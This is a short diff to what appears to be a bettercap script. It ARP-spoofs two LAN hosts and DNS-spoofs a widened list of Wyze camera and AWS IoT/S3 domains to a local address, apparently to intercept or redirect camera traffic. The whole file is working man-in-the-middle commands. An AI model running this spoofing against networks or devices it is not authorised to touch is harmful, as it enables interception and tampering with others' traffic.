@@ -1,7 +1,7 @@
 set arp.spoof.targets 192.168.4.51,192.168.4.39
 set arp.spoof.fullduplex true
 set dns.spoof.all false
-set dns.spoof.domains s3-us-west-2.amazonaws.com,a24rq1e5m4mtei.iot.us-west-2.amazonaws.com,aws-iot.wyzecam.com,api.wyzecam.com,device-api.wyzecam.com,app.wyzecam.com
+set dns.spoof.domains s3-r-w.us-west-2.amazonaws.com,s3-us-west-2.amazonaws.com,sinker-t-usw2.s3.us-west-2.amazonaws.com,wyze-iot.s3.us-west-2.amazonaws.com,a24rq1e5m4mtei.iot.us-west-2.amazonaws.com,aws-iot.wyzecam.com,api.wyzecam.com,device-api.wyzecam.com,app.wyzecam.com,dcl-api.wyzecam.com
 set dns.spoof.address 192.168.4.160
 arp.spoof on
 dns.spoof on
